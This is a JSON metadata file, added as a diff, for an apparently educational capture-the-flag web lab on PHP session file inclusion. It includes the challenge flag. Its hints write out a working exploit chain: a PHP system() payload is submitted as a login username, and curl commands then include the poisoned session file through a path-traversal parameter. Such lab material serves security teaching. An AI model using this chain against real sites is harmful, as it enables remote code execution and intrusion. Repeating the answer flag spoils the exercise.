@@ -1,0 +1,24 @@
+{
+  "id": "lfi5",
+  "category": "lfi",
+  "title": "会员中心 · session 文件包含（附 RFI 讲解）",
+  "difficulty": "hard",
+  "url_path": "/lfi5",
+  "runtime": "php",
+  "entry": "index.php",
+  "flag": "flag{lfi5_05ea48dd}",
+  "knowledge": [
+    "session 文件包含",
+    "session 落盘路径 sess_<PHPSESSID>",
+    "登录用户名污染 session",
+    "RFI 概念与 allow_url_include"
+  ],
+  "hints": [
+    "登录用户名被原样写进 session 文件：本站在 sessions/sess_<PHPSESSID>（真实环境 /var/lib/php/sessions 或 /tmp）",
+    "用 <?php system('cat /flag_lfi5.txt');?> 当用户名登录（curl -c 保存 cookie）",
+    "curl -c jar --data-urlencode \"username=<?php system('cat /flag_lfi5.txt');?>\" http://HOST/lfi5/ 然后 curl -b jar \"http://HOST/lfi5/?page=../sessions/sess_<PHPSESSID>\""
+  ],
+  "writeup": "writeup.md",
+  "prev": "lfi4",
+  "next": null
+}
